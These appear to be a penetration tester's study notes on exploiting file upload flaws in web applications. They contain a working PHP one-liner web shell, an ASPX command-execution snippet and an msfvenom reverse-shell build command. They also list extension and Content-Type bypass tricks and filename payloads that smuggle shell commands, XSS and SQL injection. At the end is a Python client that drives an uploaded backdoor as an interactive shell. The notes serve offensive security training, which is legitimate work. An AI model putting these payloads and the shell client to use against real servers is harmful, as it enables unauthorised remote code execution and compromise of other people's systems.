## Info

- Occurs when the web application does not have any form of validation filters on the uploaded files

## Enumeration

**PHP**
- Identification: `<?php system("dir");?>`
- One liner cmd php: `<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>`
- Shell: https://github.com/Arrexel/phpbash
- Seclists: https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
- Pentestmonkey: https://github.com/pentestmonkey/php-reverse-shell
- Msfvenom: `L3pr3ch4un@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

**ASPX**

```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

## Client Side Validation

We can either modify the upload request to the back-end server, or we can manipulate the front-end code to disable these type validations.

Note: We may also modify the Content-Type of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.’

**Fuzzing extesions**

Not all extensions will work with all web server configurations, so we may need to try several extensions to get one that successfully executes PHP code.

- **Common Extensions**:https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
- **PHP**:https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
- **ASP**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP

**Reverse Double Extensions**:

In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability. For example, an organization may use an open-source web application, which has a file upload functionality. Even if the file upload functionality uses a strict regex pattern that only matches the final extension in the file name, the organization may use the insecure configurations for the web server.
**eg:** filename.php.jpg

**Character Injection**:

The following are some of the characters we may try injecting:

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (shell.php%00.jpg) works with PHP servers with version 5.X or earlier

**Type Filters**

There are two common methods for validating the file content: Content-Type Header or File Content.

**Wordlist**: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt

**Mime-Type**

Multipurpose Internet Mail Extensions (MIME) is an internet standard that determines the type of a file through its general format and bytes structure.

**Injections in File Name**

```
file$(whoami).jpg
file`whoami`.jpg 
file.jpg||whoami
<script>alert(window.origin);</script>
file';select+sleep(5);--.jpg
```

**Windows Specific**:

One such attack is using reserved characters, such as (|, <, >, *, or ?), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. 


## Interact
```
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")
```
`L3pr3ch4un@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes`
